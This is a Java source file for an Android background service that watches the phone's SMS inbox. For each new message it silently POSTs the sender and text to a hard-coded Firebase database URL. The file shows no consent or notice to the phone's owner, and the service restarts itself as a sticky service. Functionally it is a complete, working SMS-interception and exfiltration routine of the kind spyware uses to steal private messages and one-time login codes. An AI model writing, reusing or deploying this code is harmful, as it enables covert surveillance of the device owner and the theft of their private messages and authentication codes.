package com.akim_sms;

import android.app.Service;
import android.content.Intent;
import android.database.ContentObserver;
import android.database.Cursor;
import android.net.Uri;
import android.os.Handler;
import android.os.IBinder;
import android.provider.Telephony;

import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;

public class SmsWatcherService extends Service {

    private static final String FIREBASE_URL =
            "https://sms-akim-default-rtdb.firebaseio.com/sms.json";

    private ContentObserver observer;
    private long lastId = 0;

    @Override
    public void onCreate() {
        super.onCreate();
        observer = new ContentObserver(new Handler()) {
            @Override
            public void onChange(boolean selfChange) {
                super.onChange(selfChange);
                verifierNouveauxSms();
            }
        };
        getContentResolver().registerContentObserver(
                Uri.parse("content://sms/"), true, observer);
    }

    private void verifierNouveauxSms() {
        Cursor cursor = getContentResolver().query(
                Uri.parse("content://sms/inbox"),
                null, null, null,
                "date DESC LIMIT 5");
        if (cursor == null) return;
        while (cursor.moveToNext()) {
            long id = cursor.getLong(cursor.getColumnIndexOrThrow("_id"));
            if (id <= lastId) continue;
            lastId = id;
            String de = cursor.getString(cursor.getColumnIndexOrThrow("address"));
            String msg = cursor.getString(cursor.getColumnIndexOrThrow("body"));
            envoyerVersFirebase(de, msg);
        }
        cursor.close();
    }

    private void envoyerVersFirebase(final String expediteur, final String message) {
        new Thread(new Runnable() {
            @Override
            public void run() {
                try {
                    URL url = new URL(FIREBASE_URL);
                    HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                    conn.setRequestMethod("POST");
                    conn.setRequestProperty("Content-Type", "application/json; charset=UTF-8");
                    conn.setDoOutput(true);

                    String exp = expediteur == null ? "" : expediteur.replace("\"", "'");
                    String msg = message == null ? "" : message.replace("\"", "'").replace("\n", " ");
                    String json = "{\"de\":\"" + exp + "\",\"msg\":\"" + msg + "\"}";

                    OutputStream os = conn.getOutputStream();
                    os.write(json.getBytes("UTF-8"));
                    os.flush();
                    os.close();
                    conn.getResponseCode();
                    conn.disconnect();
                } catch (Exception e) {
                    e.printStackTrace();
                }
            }
        }).start();
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        return START_STICKY;
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }
}
